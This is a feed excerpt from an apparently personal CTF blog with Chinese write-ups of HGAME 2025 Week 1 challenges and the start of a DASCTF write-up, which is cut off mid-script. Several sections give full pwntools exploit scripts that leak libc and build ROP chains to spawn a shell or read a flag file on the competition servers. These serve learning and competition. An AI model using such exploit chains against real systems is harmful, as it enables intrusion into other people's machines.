id="明年见">明年见！</h1><p>平台很好看，出题人很热心，题目很难（</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame{see_you_next_year!!!}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;signin2heap&quot;&gt;Signin2Heap&lt;/h1&gt;
&lt;h2 id=&quot;vulnerabilities&quot;&gt;Vulnerabilities&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;&#92;2025218-HGAME-2025-Week-2-Writeup&#92;image-20250218122102849.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;存在 off-by-null 漏洞，当 &lt;code&gt;prev_size&lt;/code&gt; 域复用时，可置零相邻
chunk 的 &lt;code&gt;prev_inuse&lt;/code&gt; 位。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://summ2.link/categories/CTF/"/>
    
    
    <category term="pwn" scheme="http://summ2.link/tags/pwn/"/>
    
    <category term="hgame" scheme="http://summ2.link/tags/hgame/"/>
    
  </entry>
  
  <entry>
    <title>HGAME 2025 Week 1 Writeup</title>
    <link href="http://summ2.link/categories/CTF/hgame-2025-week1-wp/"/>
    <id>http://summ2.link/categories/CTF/hgame-2025-week1-wp/</id>
    <published>2025-02-09T16:00:00.000Z</published>
    <updated>2025-05-08T04:15:32.805Z</updated>
    
    <content type="html"><![CDATA[<h1 id="counting-petals">counting petals</h1><h2 id="vulnerabilities">Vulnerabilities</h2><p><img src="\202518-HGAME-2025-Week-1-Writeup\image-20250210201014722.png"></p><p>存在越界写入漏洞。 <span id="more"></span></p><p><img src="\202518-HGAME-2025-Week-1-Writeup\image-20250210201156997.png"></p><p>存在任意读漏洞。</p><p><img src="\202518-HGAME-2025-Week-1-Writeup\image-20250210201358449.png"></p><h2 id="exploit">Exploit</h2><p>观察栈结构，构造数据使 v9=16 时令 v8,v9 为不合法的值，从而泄露栈上的 libc 地址。</p><p>第二次循环时利用任意写，构造 ROP 链。</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">p = remote(<span class="string">"node2.hgame.vidar.club"</span>,<span class="number">32442</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line">e = ELF(<span class="string">"./vuln"</span>)</span><br><span class="line">pop_rdi_off = <span class="number">0x2a3e5</span></span><br><span class="line">pop_rsi_off = <span class="number">0x2be51</span></span><br><span class="line">pop_rdx_r12_off= <span class="number">0x11f2e7</span></span><br><span class="line">p.sendlineafter(<span class="string">"How many flowers have you prepared this time?"</span>,<span class="string">"16"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">"the flower number"</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"the flower number"</span>,<span class="built_in">str</span>(<span class="number">0x1400000013</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"latter:"</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">b"+ 1 + "</span>)</span><br><span class="line">number = p.recvuntil(<span class="string">b" +"</span>, drop=<span class="literal">True</span>)</span><br><span class="line">number = number.decode().strip()</span><br><span class="line">libc_address = <span class="built_in">int</span>(number)</span><br><span class="line">log.info(<span class="built_in">hex</span>(libc_address))</span><br><span class="line">libc_base = libc_address - <span class="number">0x29D90</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">"execve"</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b"/bin/sh"</span>))</span><br><span class="line">pop_rdi = libc_base + pop_rdi_off</span><br><span class="line">pop_rsi = libc_base + pop_rsi_off</span><br><span class="line">pop_rdx_r12 = libc_base + pop_rdx_r12_off</span><br><span class="line">p.sendlineafter(<span class="string">"How many flowers have you prepared this time?"</span>,<span class="string">"16"</span>)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">"the flower number"</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"the flower number"</span>,<span class="built_in">str</span>(<span class="number">0x120000001a</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"the flower number"</span>,<span class="built_in">str</span>(pop_rdi)) </span><br><span class="line">p.sendlineafter(<span class="string">"the flower number"</span>,<span class="built_in">str</span>(binsh_addr))</span><br><span class="line">p.sendlineafter(<span class="string">"the flower number"</span>,<span class="built_in">str</span>(pop_rsi))</span><br><span class="line">p.sendlineafter(<span class="string">"the flower number"</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"the flower number"</span>,<span class="built_in">str</span>(pop_rdx_r12))</span><br><span class="line">p.sendlineafter(<span class="string">"the flower number"</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"the flower number"</span>,<span class="built_in">str</span>(binsh_addr))</span><br><span class="line">p.sendlineafter(<span class="string">"the flower number"</span>,<span class="built_in">str</span>(sys_addr)) </span><br><span class="line">p.sendlineafter(<span class="string">"latter:"</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><h1 id="ezstack">ezstack</h1><p>根据题目所给的 <code>Dockerfile</code> 获取远程环境相应的 libc:</p><p><code>docker build -t pwn:v1 .</code></p><p><img src="\202518-HGAME-2025-Week-1-Writeup\image-20250210202909902.png"></p><p>禁用 <code>execve</code></p><h2 id="vulnerabilities-1">Vulnerabilities</h2><p><img src="\202518-HGAME-2025-Week-1-Writeup\image-20250210202316276.png"></p><p>存在栈溢出漏洞。</p><p><img src="\202518-HGAME-2025-Week-1-Writeup\image-20250210202406705.png"></p><p>可以修改 rbp 进行栈迁移。</p><p><img src="\202518-HGAME-2025-Week-1-Writeup\image-20250210202552261.png"></p><p>有大段的可写可读段。</p><h2 id="exploit-1">Exploit</h2><p>栈迁移到恰当位置，令 <code>fd=4</code>泄露 libc 地址，并调整程序读入的长度，方便后续存放 ROP 链。</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level =<span class="string">"debug"</span></span><br><span class="line">p = remote(<span class="string">"node1.hgame.vidar.club"</span>,<span class="number">32351</span>)</span><br><span class="line">e = ELF(<span class="string">"./vuln"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.31.so"</span>)</span><br><span class="line">write_plt = e.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got = e.got[<span class="string">'write'</span>]</span><br><span class="line">writable_addr = <span class="number">0x404154</span></span><br><span class="line">read_ret = <span class="number">0x40140f</span></span><br><span class="line">pop_rdi = <span class="number">0x401713</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x401711</span></span><br><span class="line">leave_ret = <span class="number">0x401425</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"plt:"</span>,<span class="built_in">hex</span>(write_plt))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"got:"</span>,<span class="built_in">hex</span>(write_got))</span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">b'a'</span> * <span class="number">80</span> + p64(writable_addr) + p64(read_ret)</span><br><span class="line">p.sendafter(<span class="string">"Good luck."</span>,payload)</span><br><span class="line">pause()</span><br><span class="line">payload = flat({</span><br><span class="line">    <span class="number">0x00</span>: [</span><br><span class="line">        p64(writable_addr),</span><br><span class="line">        p64(pop_rdi),</span><br><span class="line">        p64(<span class="number">0x4</span>),</span><br><span class="line">        p64(pop_rsi_r15),</span><br><span class="line">        p64(write_got),p64(<span class="number">0</span>),</span><br><span class="line">        p64(write_plt), <span class="comment">#write(4,&lt;write@got&gt;)</span></span><br><span class="line">        p64(read_ret),</span><br><span class="line">        p64(leave_ret),</span><br><span class="line">    ],</span><br><span class="line">    <span class="number">0x50</span>: [</span><br><span class="line">        p64(writable_addr-<span class="number">0x50</span>),</span><br><span class="line">        p64(leave_ret),</span><br><span class="line">    ]</span><br><span class="line">})</span><br><span class="line">p.send(payload)</span><br><span class="line">write_address = u64(p.recvuntil(<span class="string">'\x00\x00'</span>,drop=<span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">libc_base = write_address - <span class="number">0x10e280</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">pop_rdx_r12 = libc_base + <span class="number">0x119431</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x2601f</span></span><br><span class="line">_read= libc_base + libc.symbols[<span class="string">"read"</span>]</span><br><span class="line">_<span class="built_in">open</span>= libc_base + libc.symbols[<span class="string">"open"</span>]</span><br><span class="line">_write= libc_base + libc.symbols[<span class="string">"write"</span>]</span><br><span class="line">payload = flat({</span><br><span class="line">    <span class="number">0x00</span>: [</span><br><span class="line">        p64(<span class="number">0x404154</span>+<span class="number">0xd0</span>),</span><br><span class="line">        p64(pop_rsi),</span><br><span class="line">        p64(<span class="number">0x404154</span>),</span><br><span class="line">        p64(pop_rdx_r12),</span><br><span class="line">        p64(<span class="number">0x200</span>),p64(<span class="number">0</span>), </span><br><span class="line">        p64(_read),<span class="comment"># read(4,buf,0x200)</span></span><br><span class="line">        p64(leave_ret),</span><br><span class="line">        p64(leave_ret),</span><br><span class="line">    ],</span><br><span class="line">    <span class="number">0x50</span>: [</span><br><span class="line">        p64(writable_addr-<span class="number">0x50</span>),</span><br><span class="line">        p64(leave_ret),</span><br><span class="line">    ]</span><br><span class="line">})</span><br><span class="line">pause()</span><br><span class="line">p.send(payload)</span><br><span class="line">payload = flat({</span><br><span class="line">    <span class="number">0x00</span>: [</span><br><span class="line">        p64(<span class="number">0xc0ffee</span>),</span><br><span class="line">        p64(pop_rdi),</span><br><span class="line">        p64(<span class="number">0x404154</span>+<span class="number">0xe0</span>),</span><br><span class="line">        p64(pop_rsi),</span><br><span class="line">        p64(<span class="number">0</span>),</span><br><span class="line">        p64(pop_rdx_r12),</span><br><span class="line">        p64(<span class="number">0</span>),p64(<span class="number">0</span>),</span><br><span class="line">        p64(_<span class="built_in">open</span>), <span class="comment"># open(./flag,0,0)</span></span><br><span class="line">        p64(pop_rdi),</span><br><span class="line">        p64(<span class="number">0x5</span>),</span><br><span class="line">        p64(pop_rsi),</span><br><span class="line">        p64(<span class="number">0x404154</span>+<span class="number">0xe0</span>),</span><br><span class="line">        p64(pop_rdx_r12),</span><br><span class="line">        p64(<span class="number">0x100</span>),p64(<span class="number">0</span>),</span><br><span class="line">        p64(_read), <span class="comment">#read(5,buf,0x100)</span></span><br><span class="line">        p64(pop_rdi),</span><br><span class="line">        p64(<span class="number">0x4</span>),</span><br><span class="line">        p64(pop_rsi),</span><br><span class="line">        p64(<span class="number">0x404154</span>+<span class="number">0xe0</span>),</span><br><span class="line">        p64(pop_rdx_r12),</span><br><span class="line">        p64(<span class="number">0x30</span>),p64(<span class="number">0</span>),</span><br><span class="line">        p64(_write), <span class="comment">#write(4,buf,0x20)</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="number">0xd0</span>: [</span><br><span class="line">        p64(<span class="number">0x404154</span>),</span><br><span class="line">        p64(leave_ret),</span><br><span class="line">    ],</span><br><span class="line">    <span class="number">0xe0</span>: [</span><br><span class="line">        <span class="string">b'./flag\x00'</span>,</span><br><span class="line">    ]</span><br><span class="line">})</span><br><span class="line">pause()</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><h1 id="format">format</h1><h2 id="vulnerabilities-2">Vulnerabilities</h2><p><img src="\202518-HGAME-2025-Week-1-Writeup\image-20250210203620876.png"></p><p>格式化字符串漏洞。</p><p><img src="\202518-HGAME-2025-Week-1-Writeup\image-20250210203709433.png"></p><p><img src="\202518-HGAME-2025-Week-1-Writeup\image-20250210203914463.png"></p><p>整型判断，使用无符号整型传入。输入一个负数即可绕过输入长度的限制。</p><p><img src="\202518-HGAME-2025-Week-1-Writeup\image-20250210204050587.png"></p><p>可以栈迁移。</p><h2 id="exploit-2">Exploit</h2><p>使用 <code>%p</code> 泄露栈的地址，在 <code>vuln</code>函数的栈帧内写入更长的格式化字符串，然后控制 <code>rbp</code>到合适位置，溢出覆盖返回地址为格式化漏洞处，泄露 libc 地址，再次进入<code>vuln</code> 构造 ROP 链。</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level =<span class="string">"debug"</span></span><br><span class="line">p = remote(<span class="string">"node1.hgame.vidar.club"</span>,<span class="number">30762</span>)</span><br><span class="line">e = ELF(<span class="string">"./vuln"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line">leave_ret = <span class="number">0x4011ee</span></span><br><span class="line">main = <span class="number">0x4011f0</span></span><br><span class="line">p.sendlineafter(<span class="string">"you have n chance to getshell"</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"type something:"</span>,<span class="string">"%p"</span>)</span><br><span class="line">p.recvuntil(<span class="string">b"you type: 0x"</span>)</span><br><span class="line">stack_addr = p.recvuntil(<span class="string">b"you have"</span>, drop=<span class="literal">True</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(stack_addr,<span class="number">16</span>)</span><br><span class="line">log.info(<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">rbp = stack_addr + <span class="number">0x211c</span></span><br><span class="line">p.sendafter(<span class="string">"n = "</span>,<span class="string">"-1\x00"</span>)</span><br><span class="line">pause()</span><br><span class="line">payload = flat({</span><br><span class="line">    <span class="number">0x00</span>: [</span><br><span class="line">        <span class="string">b'%9$p'</span>,</span><br><span class="line">        p64(rbp),</span><br><span class="line">        p64(<span class="number">0x4012cf</span>),</span><br><span class="line">    ]</span><br><span class="line">})</span><br><span class="line">p.sendafter(<span class="string">"type something:"</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b"0x"</span>,drop=<span class="literal">True</span>)</span><br><span class="line">libc_addr = p.recv(<span class="number">12</span>)</span><br><span class="line">libc_addr = <span class="built_in">int</span>(libc_addr,<span class="number">16</span>)</span><br><span class="line">libc_base = libc_addr - <span class="number">0x29d90</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b"/bin/sh"</span>))</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">"system"</span>]</span><br><span class="line">pop_rdi = libc_base + <span class="number">0x2a3e5</span></span><br><span class="line">payload = flat({</span><br><span class="line">    <span class="number">0x0c</span>: [</span><br><span class="line">        p64(<span class="number">0x40101a</span>),</span><br><span class="line">        p64(pop_rdi),</span><br><span class="line">        p64(binsh_addr),</span><br><span class="line">        p64(sys_addr)</span><br><span class="line">    ]</span><br><span class="line">})</span><br><span class="line">p.sendafter(<span class="string">"type something:"</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><h1 id="compress-dot-new">Compress dot new</h1><p>题目给出 Nushell 编写的 Huffman 编码，解码代码如下</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">def "decode" [tree encoded] {</span><br><span class="line">    let bits = ($encoded | split chars)</span><br><span class="line">    mut result = []</span><br><span class="line">    mut current_node = $tree</span><br><span class="line">    for bit in $bits {</span><br><span class="line">        $current_node = if $bit == '0' {</span><br><span class="line">            $current_node.a</span><br><span class="line">        } else { $current_node.b }</span><br><span class="line">        if 's' in $current_node {</span><br><span class="line">            $result ++= [$current_node.s]</span><br><span class="line">            $current_node = $tree</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    if 's' in $current_node {</span><br><span class="line">        $result ++= [$current_node.s]</span><br><span class="line">    }</span><br><span class="line">    $result | each { into binary } | bytes collect</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">def "decompress" [] {</span><br><span class="line">    let input = (open ./enc.txt --raw | split row "\n")</span><br><span class="line">    let tree = $input.0 | from json</span><br><span class="line">    let encoded_str = $input.1</span><br><span class="line">    decode $tree $encoded_str</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">decompress | save ./flag.txt --force</span><br></pre></td></tr></tbody></table></figure><p><em>部分内容参考 DeepSeek R1 生成</em></p><h1 id="turtle">Turtle</h1><p><img src="\202518-HGAME-2025-Week-1-Writeup\image-20250210205306105.png"></p><p>DIE 检测存在 upx 壳，使用 x64dbg 定位程序入口点后 dump 脱壳。</p><p>程序使用两次 RC4加密，依该加密算法的对称性质，第一次加密函数处传入密文得到 key。</p><p>第二次加密函数处将 <code>-=</code> patch 为<code>+=</code>，传入密文得到 flag。</p><p><img src="\202518-HGAME-2025-Week-1-Writeup\image-20250210205721736.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;counting-petals&quot;&gt;counting petals&lt;/h1&gt;
&lt;h2 id=&quot;vulnerabilities&quot;&gt;Vulnerabilities&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;&#92;202518-HGAME-2025-Week-1-Writeup&#92;image-20250210201014722.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;存在越界写入漏洞。</summary>
    
    
    
    <category term="CTF" scheme="http://summ2.link/categories/CTF/"/>
    
    
    <category term="pwn" scheme="http://summ2.link/tags/pwn/"/>
    
    <category term="re" scheme="http://summ2.link/tags/re/"/>
    
    <category term="hgame" scheme="http://summ2.link/tags/hgame/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF12 月赛复现</title>
    <link href="http://summ2.link/categories/CTF/dasctf2025-12-wp/"/>
    <id>http://summ2.link/categories/CTF/dasctf2025-12-wp/</id>
    <published>2025-01-07T16:00:00.000Z</published>
    <updated>2025-05-08T04:15:59.776Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言">前言</h1><p>本次 DASCTF12 月赛尝试了 pwn 方向的两道题目，最终还是如愿以偿的爆零了。首先看到题目我就有种陌生的感觉，给定程序是去掉调试符号的，并且有多个函数，大大降低了可读性，和我先前遇见的题目有不小的区别。<span id="more"></span></p><h1 id="basemachine">BaseMachine</h1><h2 id="checksec">checksec</h2><figure><img src="/202518-DASCTF12月赛复现\image-20250108110826276.png" alt="保护全开"><figcaption aria-hidden="true">保护全开</figcaption></figure><h2 id="逆向分析">逆向分析</h2><figure><img src="/202518-DASCTF12月赛复现\image-20250108110920209.png" alt="main"><figcaption aria-hidden="true">main</figcaption></figure><p>读入 <code>./flag</code> 后传入<code>sub_3990</code>，图中的乱码是表情，是 IDA 的编码问题。后面是循环读入用户输入，同样传入<code>sub_3990</code>。</p><p>进入 <code>sub_3990</code> 继续分析：</p><figure><img src="/202518-DASCTF12月赛复现\image-20250108111643902.png" alt="v9"><figcaption aria-hidden="true">v9</figcaption></figure><p>根据传入的参数 <code>a1</code>, <code>a2</code>决定程序后续流程，具体是编码类型 (base64, base85...)。</p><p>有意思的是，程序将字符串的加解密流程放在在 <code>_data</code>，即数据段中。</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v10 = ((__int64 (__fastcall *)(<span class="type">char</span> *, <span class="type">const</span> <span class="type">char</span> *))*(&amp;off_7260 + v8))(s, a3);</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000007260 off_7260        dq offset sub_1D6A      ; DATA XREF: sub_3990+155↑o</span><br><span class="line">.data:0000000000007260                                         ; sub_3990+1C8↑o</span><br><span class="line">.data:0000000000007268                 dq offset sub_1ED6</span><br><span class="line">.data:0000000000007270                 dq offset sub_22B2</span><br><span class="line">.data:0000000000007278                 dq offset sub_27D4</span><br><span class="line">.data:0000000000007280                 dq offset sub_2B94</span><br><span class="line">.data:0000000000007288                 dq offset sub_2E17</span><br><span class="line">.data:0000000000007290                 dq offset sub_3498</span><br><span class="line">.data:0000000000007290 _data           ends</span><br><span class="line">.data:0000000000007290</span><br></pre></td></tr></tbody></table></figure><p>这涉及到 C 语言中<strong>函数指针</strong>的概念:</p><p>函数指针是一个指向函数的<strong>指针</strong>变量，如：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> (*p)(<span class="type">int</span> x, <span class="type">int</span>  y);</span><br></pre></td></tr></tbody></table></figure><p>具有两个整型参数，返回值是整型。</p><p>如下代码实现了通过函数指针调用函数：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">maxValue</span> <span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>{</span><br><span class="line">    <span class="keyword">return</span> a &gt; b ? a : b;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> (*p)(<span class="type">int</span>, <span class="type">int</span>) = <span class="literal">NULL</span>;</span><br><span class="line">p = maxValue;</span><br><span class="line"><span class="built_in">p</span>(<span class="number">1</span>, <span class="number">2</span>);</span><br></pre></td></tr></tbody></table></figure><p>而题目程序中就是通过类似这样的函数指针数组实现的。</p><p>接着，根据与 <code>unk_73C0</code> 中的数据比较这一功能可以（应该？）推测是在计算哈希</p><figure><img src="/202518-DASCTF12月赛复现\image-20250108114221721.png" alt="wp中指出这是在计算SHA256"><figcaption aria-hidden="true">wp 中指出这是在计算 SHA256</figcaption></figure><p>如果没有找到相同的，就使用新的槽位：</p><figure><img src="/202518-DASCTF12月赛复现\image-20250108114849186.png" alt="选择最先或未使用的槽位，覆盖该槽位存储的数据"><figcaption aria-hidden="true">选择最先或未使用的槽位，覆盖该槽位存储的数据</figcaption></figure><p>存、读取哈希和密文部分：</p><p><img src="/202518-DASCTF12月赛复现\image-20250108120631350.png"></p><p>解密、输出部分：</p><figure><img src="/202518-DASCTF12月赛复现\image-20250108115753563.png" alt="是否输出由传入参数a4决定"><figcaption aria-hidden="true">是否输出由传入参数 <code>a4</code> 决定</figcaption></figure><h2 id="vulnerabilities">Vulnerabilities</h2><p>与 <code>unk_73C0</code> 读写有关的函数 <code>sub_37A4</code>中存在<strong>溢出漏洞</strong></p><figure><img src="/202518-DASCTF12月赛复现\image-20250108121903389.png" alt="数组只能储存0-5"><figcaption aria-hidden="true">数组只能储存 0-5</figcaption></figure><figure><img src="/202518-DASCTF12月赛复现\image-20250110222812447.png" alt="unk_73c0将编码类型和明文写入对应位置"><figcaption aria-hidden="true"><code>unk_73c0</code> 将编码类型和明文写入对应位置</figcaption></figure><h2 id="攻击流程">攻击流程</h2><p>以下为官方 wp 思路。</p><p>寻找具有 'b85' 开头 SHA256 值的字符串，将 flag 槽位上的哈希修改为这个值。具体实现如下（来自官方 wp）：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">"tmux"</span>, <span 